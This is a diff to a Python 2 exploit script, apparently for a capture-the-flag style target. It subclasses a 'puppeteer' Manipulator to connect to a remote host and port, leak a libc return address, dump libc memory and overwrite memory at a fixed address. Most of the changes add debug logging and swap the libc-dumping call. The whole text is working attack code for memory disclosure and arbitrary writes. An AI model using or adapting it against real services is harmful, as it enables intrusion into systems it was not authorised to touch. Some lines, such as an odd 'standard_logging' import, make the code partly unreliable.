@@ -1,6 +1,10 @@
 import puppeteer
 
 import logging
+import standard_logging
+logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
+logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
+logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)
 
 class Aggravator(puppeteer.Manipulator):
     def __init__(self, host, port):
@@ -26,14 +30,10 @@ class Aggravator(puppeteer.Manipulator):
             print "Program didn't finish the print"
             return ""
 
-        #print "GOT:",repr(result)
+        print "GOT:",repr(result)
         return result
 
 def main():
-    logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
-    #logging.getLogger("puppeteer.utils").setLevel(logging.DEBUG)
-    #logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)
-
     # Create the Aggravator!
     a = Aggravator(sys.argv[1], int(sys.argv[2]))
 
@@ -49,8 +49,9 @@ def main():
     print "main() will return to (presumably, this is in libc):",hex(lcsm)
 
     # now dump it!
-    libc = a.dump_pageset(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
-    print "dumped %d pages from libc" % len(libc)
+    #libc = a.dump_elf(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
+    #print "dumped %d pages from libc" % len(libc)
+    a.dump_libc("aggregator_libc", start_offset=390)
 
     # We can overwrite memory with ease!
     a.do_memory_write(0x0804C344, "OK")
